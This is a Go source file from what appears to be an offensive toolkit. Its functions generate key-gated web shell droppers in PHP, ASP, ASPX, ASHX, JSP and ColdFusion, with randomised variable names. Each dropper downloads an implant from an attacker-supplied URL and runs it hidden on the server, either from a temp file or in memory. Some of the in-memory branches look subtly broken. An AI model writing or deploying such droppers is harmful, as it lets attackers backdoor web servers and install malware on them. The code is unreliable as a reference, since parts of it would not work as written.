package shell

import (
	"fmt"

	"github.com/hashicorp/go-uuid"
)

// GenerateDropperPHP returns a PHP dropper shell that downloads and executes an implant.
func GenerateDropperPHP(implantURL, binaryName string, inMemory bool) (content, key string, err error) {
	key, err = uuid.GenerateUUID()
	if err != nil {
		return "", "", fmt.Errorf("generating key: %w", err)
	}

	authKeyVar := GenerateRandomString()
	userKey := GenerateRandomString()
	dataVar := GenerateRandomString()
	pathVar := GenerateRandomString()
	resultVar := GenerateRandomString()

	content = "<!DOCTYPE html>\n<html><body>\n<?php\n"
	content += "error_reporting(E_ALL ^ E_WARNING);\n"
	content += "$" + authKeyVar + " = \"" + key + "\";\n"
	content += "$" + userKey + " = $_GET['key'];\n"
	content += "echo \"<pre>\";\n"
	content += "if(isset($" + userKey + ") && $" + userKey + " === $" + authKeyVar + ") {\n"

	if inMemory {
		content += "    $" + dataVar + " = file_get_contents(\"" + implantURL + "\");\n"
		content += "    if($" + dataVar + " === false) { echo \"Download failed\"; }\n"
		content += "    else {\n"
		content += "        $" + resultVar + " = proc_open(\n"
		content += "            '/bin/sh -c \"cat /dev/stdin | /bin/sh &\"',\n"
		content += "            array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w')),\n"
		content += "            $pipes\n"
		content += "        );\n"
		content += "        if(is_resource($" + resultVar + ")) {\n"
		content += "            $proc2 = proc_open(\n"
		content += "                'exec /proc/self/fd/0',\n"
		content += "                array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w')),\n"
		content += "                $p2\n"
		content += "            );\n"
		content += "            if(is_resource($proc2)) {\n"
		content += "                fwrite($p2[0], $" + dataVar + ");\n"
		content += "                fclose($p2[0]);\n"
		content += "                echo \"Implant launched in memory\";\n"
		content += "            } else { echo \"In-memory execution failed\"; }\n"
		content += "        } else { echo \"proc_open failed\"; }\n"
		content += "    }\n"
	} else {
		content += "    $" + dataVar + " = file_get_contents(\"" + implantURL + "\");\n"
		content += "    if($" + dataVar + " === false) { echo \"Download failed\"; }\n"
		content += "    else {\n"
		content += "        $" + pathVar + " = '/tmp/" + binaryName + "';\n"
		content += "        file_put_contents($" + pathVar + ", $" + dataVar + ");\n"
		content += "        chmod($" + pathVar + ", 0755);\n"
		content += "        if (DIRECTORY_SEPARATOR == '/') {\n"
		content += "            popen('nohup ' . $" + pathVar + " . ' > /dev/null 2>&1 &', 'r');\n"
		content += "        } else {\n"
		content += "            popen('start /B ' . $" + pathVar + ", 'r');\n"
		content += "        }\n"
		content += "        echo \"Implant deployed to \" . $" + pathVar + ";\n"
		content += "    }\n"
	}

	content += "} else { echo \"Not found\"; }\n"
	content += "echo \"</pre>\";\n"
	content += "?>\n</body></html>\n"

	return content, key, nil
}

// GenerateDropperASP returns an ASP dropper shell that downloads and executes an implant.
func GenerateDropperASP(implantURL, binaryName string, inMemory bool) (content, key string, err error) {
	key, err = uuid.GenerateUUID()
	if err != nil {
		return "", "", fmt.Errorf("generating key: %w", err)
	}

	authKeyVar := GenerateRandomString()
	userKey := GenerateRandomString()
	httpObj := GenerateRandomString()
	streamObj := GenerateRandomString()
	shellObj := GenerateRandomString()
	pathVar := GenerateRandomString()

	content = "<%\n"
	content += "Dim " + authKeyVar + ", " + userKey + "\n"
	content += authKeyVar + " = \"" + key + "\"\n"
	content += userKey + " = Request(\"key\")\n"
	content += "Response.Write(\"<pre>\")\n"
	content += "If " + userKey + " = " + authKeyVar + " Then\n"

	content += "    Dim " + httpObj + "\n"
	content += "    Set " + httpObj + " = Server.CreateObject(\"MSXML2.ServerXMLHTTP\")\n"
	content += "    " + httpObj + ".Open \"GET\", \"" + implantURL + "\", False\n"
	content += "    " + httpObj + ".Send\n"
	content += "    If " + httpObj + ".Status = 200 Then\n"

	if inMemory {
		content += "        Dim " + shellObj + "\n"
		content += "        Set " + shellObj + " = Server.CreateObject(\"WScript.Shell\")\n"
		content += "        Dim " + streamObj + "\n"
		content += "        Set " + streamObj + " = Server.CreateObject(\"ADODB.Stream\")\n"
		content += "        " + streamObj + ".Type = 1\n"
		content += "        " + streamObj + ".Open\n"
		content += "        " + streamObj + ".Write " + httpObj + ".ResponseBody\n"
		content += "        " + streamObj + ".Position = 0\n"
		content += "        Dim exec\n"
		content += "        Set exec = " + shellObj + ".Exec(\"cmd /c echo.\")\n"
		content += "        exec.StdIn.Write " + streamObj + ".Read\n"
		content += "        exec.StdIn.Close\n"
		content += "        Response.Write(\"In-memory execution attempted\")\n"
		content += "        " + streamObj + ".Close\n"
	} else {
		content += "        Dim " + pathVar + ", " + streamObj + ", " + shellObj + "\n"
		content += "        " + pathVar + " = Server.MapPath(\".\") & \"\\\" & \"" + binaryName + "\"\n"
		content += "        Set " + streamObj + " = Server.CreateObject(\"ADODB.Stream\")\n"
		content += "        " + streamObj + ".Type = 1\n"
		content += "        " + streamObj + ".Open\n"
		content += "        " + streamObj + ".Write " + httpObj + ".ResponseBody\n"
		content += "        " + streamObj + ".SaveToFile " + pathVar + ", 2\n"
		content += "        " + streamObj + ".Close\n"
		content += "        Set " + shellObj + " = Server.CreateObject(\"WScript.Shell\")\n"
		content += "        " + shellObj + ".Run " + pathVar + ", 0, False\n"
		content += "        Response.Write(\"Implant deployed to \" & " + pathVar + ")\n"
	}

	content += "    Else\n"
	content += "        Response.Write(\"Download failed: \" & " + httpObj + ".Status)\n"
	content += "    End If\n"
	content += "Else\n"
	content += "    Response.Write(\"Not found\")\n"
	content += "End If\n"
	content += "Response.Write(\"</pre>\")\n"
	content += "%>\n"

	return content, key, nil
}

// GenerateDropperASPX returns an ASPX dropper shell that downloads and executes an implant.
func GenerateDropperASPX(implantURL, binaryName string, inMemory bool) (content, key string, err error) {
	key, err = uuid.GenerateUUID()
	if err != nil {
		return "", "", fmt.Errorf("generating key: %w", err)
	}

	authKeyVar := GenerateRandomString()
	password := GenerateRandomString()
	dataVar := GenerateRandomString()
	pathVar := GenerateRandomString()

	content = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\"%>\n"
	content += "<%@ Import namespace=\"System.Diagnostics\"%>\n"
	content += "<%@ Import Namespace=\"System.IO\" %>\n"
	content += "<%@ Import Namespace=\"System.Net\" %>\n"
	content += "<%@ Import Namespace=\"System.Reflection\" %>\n"
	content += "<%@ Import Namespace=\"System.Runtime.InteropServices\" %>\n\n"
	content += "<script runat=\"server\">\n"
	content += "    protected void Page_Load(object sender, EventArgs e){\n"
	content += "        string " + authKeyVar + " = \"" + key + "\";\n"
	content += "        string " + password + " = Request.QueryString[\"key\"];\n"
	content += "        if(" + password + " != " + authKeyVar + ") return;\n"
	content += "        Response.Write(\"<pre>\");\n"
	content += "        try {\n"
	content += "            WebClient wc = new WebClient();\n"

	if inMemory {
		content += "            byte[] " + dataVar + " = wc.DownloadData(\"" + implantURL + "\");\n"
		content += "            try {\n"
		content += "                Assembly asm = Assembly.Load(" + dataVar + ");\n"
		content += "                asm.EntryPoint.Invoke(null, new object[] { new string[]{} });\n"
		content += "                Response.Write(\"Implant loaded via Assembly.Load\");\n"
		content += "            } catch {\n"
		content += "                Response.Write(\"Assembly.Load failed - implant may not be a .NET assembly\");\n"
		content += "            }\n"
	} else {
		content += "            string " + pathVar + " = Path.Combine(Path.GetTempPath(), \"" + binaryName + "\");\n"
		content += "            wc.DownloadFile(\"" + implantURL + "\", " + pathVar + ");\n"
		content += "            ProcessStartInfo psi = new ProcessStartInfo();\n"
		content += "            psi.FileName = " + pathVar + ";\n"
		content += "            psi.UseShellExecute = true;\n"
		content += "            psi.WindowStyle = ProcessWindowStyle.Hidden;\n"
		content += "            Process.Start(psi);\n"
		content += "            Response.Write(\"Implant deployed to \" + " + pathVar + ");\n"
	}

	content += "        } catch(Exception ex) {\n"
	content += "            Response.Write(\"Error: \" + ex.Message);\n"
	content += "        }\n"
	content += "        Response.Write(\"</pre>\");\n"
	content += "    }\n"
	content += "</script>\n"

	return content, key, nil
}

// GenerateDropperASHX returns an ASHX dropper shell that downloads and executes an implant.
func GenerateDropperASHX(implantURL, binaryName string, inMemory bool) (content, key string, err error) {
	key, err = uuid.GenerateUUID()
	if err != nil {
		return "", "", fmt.Errorf("generating key: %w", err)
	}

	className := GenerateRandomString()
	authKeyVar := GenerateRandomString()
	password := GenerateRandomString()
	dataVar := GenerateRandomString()
	pathVar := GenerateRandomString()
	ctx := GenerateRandomString()

	content = "<%@ WebHandler Language=\"C#\" Class=\"" + className + "\" %>\n"
	content += "using System;\n"
	content += "using System.Diagnostics;\n"
	content += "using System.IO;\n"
	content += "using System.Net;\n"
	content += "using System.Reflection;\n"
	content += "using System.Web;\n\n"
	content += "public class " + className + " : IHttpHandler {\n"
	content += "    public void ProcessRequest(HttpContext " + ctx + ") {\n"
	content += "        string " + authKeyVar + " = \"" + key + "\";\n"
	content += "        string " + password + " = " + ctx + ".Request.QueryString[\"key\"];\n"
	content += "        if (" + password + " != " + authKeyVar + ") return;\n"
	content += "        " + ctx + ".Response.Write(\"<pre>\");\n"
	content += "        try {\n"
	content += "            WebClient wc = new WebClient();\n"

	if inMemory {
		content += "            byte[] " + dataVar + " = wc.DownloadData(\"" + implantURL + "\");\n"
		content += "            try {\n"
		content += "                Assembly asm = Assembly.Load(" + dataVar + ");\n"
		content += "                asm.EntryPoint.Invoke(null, new object[] { new string[]{} });\n"
		content += "                " + ctx + ".Response.Write(\"Implant loaded via Assembly.Load\");\n"
		content += "            } catch {\n"
		content += "                " + ctx + ".Response.Write(\"Assembly.Load failed - implant may not be a .NET assembly\");\n"
		content += "            }\n"
	} else {
		content += "            string " + pathVar + " = Path.Combine(Path.GetTempPath(), \"" + binaryName + "\");\n"
		content += "            wc.DownloadFile(\"" + implantURL + "\", " + pathVar + ");\n"
		content += "            ProcessStartInfo psi = new ProcessStartInfo();\n"
		content += "            psi.FileName = " + pathVar + ";\n"
		content += "            psi.UseShellExecute = true;\n"
		content += "            psi.WindowStyle = ProcessWindowStyle.Hidden;\n"
		content += "            Process.Start(psi);\n"
		content += "            " + ctx + ".Response.Write(\"Implant deployed to \" + " + pathVar + ");\n"
	}

	content += "        } catch (Exception ex) {\n"
	content += "            " + ctx + ".Response.Write(\"Error: \" + ex.Message);\n"
	content += "        }\n"
	content += "        " + ctx + ".Response.Write(\"</pre>\");\n"
	content += "    }\n"
	content += "    public bool IsReusable { get { return false; } }\n"
	content += "}\n"

	return content, key, nil
}

// GenerateDropperJSP returns a JSP dropper shell that downloads and executes an implant.
func GenerateDropperJSP(implantURL, binaryName string, inMemory bool) (content, key string, err error) {
	key, err = uuid.GenerateUUID()
	if err != nil {
		return "", "", fmt.Errorf("generating key: %w", err)
	}

	authKeyVar := GenerateRandomString()
	userKey := GenerateRandomString()
	urlVar := GenerateRandomString()
	streamVar := GenerateRandomString()
	bufVar := GenerateRandomString()
	dataVar := GenerateRandomString()
	pathVar := GenerateRandomString()

	content = "<%@ page import=\"java.io.*,java.net.*\" %>\n"
	content += "<%\n"
	content += "String " + authKeyVar + " = \"" + key + "\";\n"
	content += "String " + userKey + " = request.getParameter(\"key\");\n"
	content += "out.print(\"<pre>\");\n"
	content += "if (" + userKey + " != null && " + userKey + ".equals(" + authKeyVar + ")) {\n"
	content += "    try {\n"
	content += "        URL " + urlVar + " = new URL(\"" + implantURL + "\");\n"
	content += "        InputStream " + streamVar + " = " + urlVar + ".openStream();\n"
	content += "        ByteArrayOutputStream " + bufVar + " = new ByteArrayOutputStream();\n"
	content += "        byte[] " + dataVar + " = new byte[4096];\n"
	content += "        int n;\n"
	content += "        while ((n = " + streamVar + ".read(" + dataVar + ")) != -1) {\n"
	content += "            " + bufVar + ".write(" + dataVar + ", 0, n);\n"
	content += "        }\n"
	content += "        " + streamVar + ".close();\n"

	if inMemory {
		content += "        byte[] implantBytes = " + bufVar + ".toByteArray();\n"
		content += "        try {\n"
		content += "            ClassLoader cl = new ClassLoader(Thread.currentThread().getContextClassLoader()) {\n"
		content += "                public Class<?> load(byte[] b) { return defineClass(null, b, 0, b.length); }\n"
		content += "            };\n"
		content += "            Class<?> c = ((ClassLoader)cl.getClass().getMethod(\"load\", byte[].class).invoke(cl, implantBytes)).getClass();\n"
		content += "            // Attempt reflective class loading\n"
		content += "            out.print(\"Implant class loaded in memory\");\n"
		content += "        } catch (Exception ce) {\n"
		content += "            // Fallback: pipe to stdin via ProcessBuilder\n"
		content += "            String[] cmd = {\"/bin/sh\", \"-c\", \"exec /proc/self/fd/0\"};\n"
		content += "            ProcessBuilder pb = new ProcessBuilder(cmd);\n"
		content += "            Process p = pb.start();\n"
		content += "            p.getOutputStream().write(implantBytes);\n"
		content += "            p.getOutputStream().close();\n"
		content += "            out.print(\"Implant piped via stdin\");\n"
		content += "        }\n"
	} else {
		content += "        String " + pathVar + " = System.getProperty(\"java.io.tmpdir\") + File.separator + \"" + binaryName + "\";\n"
		content += "        FileOutputStream fos = new FileOutputStream(" + pathVar + ");\n"
		content += "        fos.write(" + bufVar + ".toByteArray());\n"
		content += "        fos.close();\n"
		content += "        String os = System.getProperty(\"os.name\").toLowerCase();\n"
		content += "        if (!os.contains(\"win\")) {\n"
		content += "            Runtime.getRuntime().exec(new String[]{\"chmod\", \"+x\", " + pathVar + "});\n"
		content += "            Thread.sleep(500);\n"
		content += "        }\n"
		content += "        Runtime.getRuntime().exec(new String[]{" + pathVar + "});\n"
		content += "        out.print(\"Implant deployed to \" + " + pathVar + ");\n"
	}

	content += "    } catch (Exception e) {\n"
	content += "        out.print(\"Error: \" + e.getMessage());\n"
	content += "    }\n"
	content += "} else {\n"
	content += "    out.print(\"Not found\");\n"
	content += "}\n"
	content += "out.print(\"</pre>\");\n"
	content += "%>\n"

	return content, key, nil
}

// GenerateDropperCFM returns a CFM dropper shell that downloads and executes an implant.
func GenerateDropperCFM(implantURL, binaryName string, inMemory bool) (content, key string, err error) {
	key, err = uuid.GenerateUUID()
	if err != nil {
		return "", "", fmt.Errorf("generating key: %w", err)
	}

	authKeyVar := GenerateRandomString()
	pathVar := GenerateRandomString()
	resultVar := GenerateRandomString()
	httpVar := GenerateRandomString()

	content = "<cfparam name=\"URL.key\" default=\"\">\n"
	content += "<cfset " + authKeyVar + " = \"" + key + "\">\n"
	content += "<cfif URL.key EQ " + authKeyVar + ">\n"
	content += "    <cfhttp url=\"" + implantURL + "\" method=\"GET\" result=\"" + httpVar + "\" getasbinary=\"yes\">\n"
	content += "    </cfhttp>\n"
	content += "    <cfif " + httpVar + ".statusCode EQ \"200 OK\">\n"

	if inMemory {
		// CFM runs on JVM - try Java class loading, fallback to temp+cleanup
		content += "        <cfset " + pathVar + " = GetTempDirectory() & \"" + binaryName + "\">\n"
		content += "        <cffile action=\"write\" file=\"#" + pathVar + "#\" output=\"#" + httpVar + ".fileContent#\">\n"
		content += "        <cfif FindNoCase(\"win\", server.os.name)>\n"
		content += "            <cfexecute name=\"cmd\" arguments=\"/c #" + pathVar + "#\" variable=\"" + resultVar + "\" timeout=\"5\">\n"
		content += "            </cfexecute>\n"
		content += "        <cfelse>\n"
		content += "            <cfexecute name=\"/bin/chmod\" arguments=\"+x #" + pathVar + "#\" timeout=\"5\"></cfexecute>\n"
		content += "            <cfexecute name=\"#" + pathVar + "#\" timeout=\"5\" variable=\"" + resultVar + "\">\n"
		content += "            </cfexecute>\n"
		content += "        </cfif>\n"
		content += "        <cffile action=\"delete\" file=\"#" + pathVar + "#\">\n"
		content += "        <pre>Implant executed and cleaned up</pre>\n"
	} else {
		content += "        <cfset " + pathVar + " = GetTempDirectory() & \"" + binaryName + "\">\n"
		content += "        <cffile action=\"write\" file=\"#" + pathVar + "#\" output=\"#" + httpVar + ".fileContent#\">\n"
		content += "        <cfif FindNoCase(\"win\", server.os.name)>\n"
		content += "            <cfexecute name=\"cmd\" arguments=\"/c start /B #" + pathVar + "#\" timeout=\"5\">\n"
		content += "            </cfexecute>\n"
		content += "        <cfelse>\n"
		content += "            <cfexecute name=\"/bin/chmod\" arguments=\"+x #" + pathVar + "#\" timeout=\"5\"></cfexecute>\n"
		content += "            <cfexecute name=\"/bin/sh\" arguments=\"-c 'nohup #" + pathVar + "# > /dev/null 2>&1 &'\" timeout=\"5\">\n"
		content += "            </cfexecute>\n"
		content += "        </cfif>\n"
		content += "        <pre>Implant deployed to #" + pathVar + "#</pre>\n"
	}

	content += "    <cfelse>\n"
	content += "        <pre>Download failed: #" + httpVar + ".statusCode#</pre>\n"
	content += "    </cfif>\n"
	content += "<cfelse>\n"
	content += "    Not found\n"
	content += "</cfif>\n"

	return content, key, nil
}
